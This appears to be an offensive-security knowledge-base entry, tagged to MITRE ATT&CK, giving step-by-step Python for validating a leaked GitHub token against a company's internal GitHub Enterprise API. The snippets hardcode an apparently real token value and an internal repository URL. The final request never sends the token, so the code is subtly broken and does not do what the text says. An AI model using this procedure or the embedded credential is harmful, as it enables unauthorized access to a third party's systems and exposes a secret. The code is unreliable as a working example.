---
tags:
  - token-leak
  - credential-access
  - api-token
type: procedure
tools:
  - '[[tools/Firefox]]'
tactics:
  - '[[Credential Access]]'
commands:
  - '[[commands/python-import-os]]'
  - '[[commands/python-import-requests]]'
  - '[[commands/python-import-sys]]'
  - '[[commands/python-set-pull-number]]'
  - '[[commands/python-construct-pull-url]]'
  - '[[commands/python-initialize-payload]]'
  - '[[commands/python-add-authorization-header]]'
  - '[[commands/python-print-payload]]'
  - '[[commands/python-requests-get]]'
platforms:
  - Web
  - GitHub Enterprise
techniques:
  - '[[Unsecured Credentials]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[Credentials in Files]]'
id: afc89f04-b0aa-4fc5-a3c9-06fc5a148131
created_at: '2025-12-11T06:10:28.333Z'
updated_at: '2025-12-11T06:10:28.333Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0006]]'
mitre_techniques:
  - '[[T1552]]'
---
# Extract and Validate Leaked GitHub Token

## Summary

This procedure extracts a leaked GitHub API token from a Python script in a public repository and validates its functionality by reconstructing API requests to access internal endpoints.

## Description

After discovering the leaked token, the attacker reconstructs the Python script to test access to internal GitHub Enterprise API, such as pull requests. This targets web and GitHub Enterprise platforms, using Python for validation. The root cause is cleartext storage of sensitive information, leading to potential unauthorized access.

## Requirements

1. Python environment installed
2. Requests library for HTTP requests
3. Access to the leaked token value

## Defense

Defensive measures and detection strategies:

- Rotate tokens immediately upon detection
- Monitor API logs for unauthorized access attempts

## Objectives

1. Extract the token from code
2. Validate token for API access
3. Demonstrate information disclosure

## Instructions

### Step 1: Import Required Modules

**Context**: Set up the Python environment for making API requests.

Execute [[commands/python-import-os]]:

```python
import os
```

> Imports os module.

Execute [[commands/python-import-requests]]:

```python
import requests
```

> Imports requests library.

Execute [[commands/python-import-sys]]:

```python
import sys
```

> Imports sys module.

### Step 2: Set Variables and Construct URL

**Context**: Prepare the API endpoint URL.

Execute [[commands/python-set-pull-number]]:

```python
pull_number = 76793
```

> Sets pull request number.

Execute [[commands/python-construct-pull-url]]:

```python
pull_url = "https://github.sc-corp.net/api/v3/repos/Snapchat/android/pulls/" + str(pull_number)
```

> Constructs the URL.

### Step 3: Build Payload and Add Token

**Context**: Create the authentication payload with the leaked token.

Execute [[commands/python-initialize-payload]]:

```python
payload = {}
```

> Initializes payload dictionary.

Execute [[commands/python-add-authorization-header]]:

```python
payload["Authorization"] = "token " + "9db9ca3440e535d90408a32a9c03d415979da910"
```

> Adds authorization header.

Execute [[commands/python-print-payload]]:

```python
print(payload)
```

> Prints the payload for verification.

### Step 4: Execute API Request

**Context**: Make the GET request to validate access.

Execute [[commands/python-requests-get]]:

```python
r = requests.get(pull_url)
```

> Sends the request and checks response.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[Unsecured Credentials]]

### Sub-Techniques

- [[Credentials in Files]]

## Commands Used

- [[commands/python-import-os]]
- [[commands/python-import-requests]]
- [[commands/python-import-sys]]
- [[commands/python-set-pull-number]]
- [[commands/python-construct-pull-url]]
- [[commands/python-initialize-payload]]
- [[commands/python-add-authorization-header]]
- [[commands/python-print-payload]]
- [[commands/python-requests-get]]

## Tools Used



## Tags

- token-leak
- credential-access
- api-token
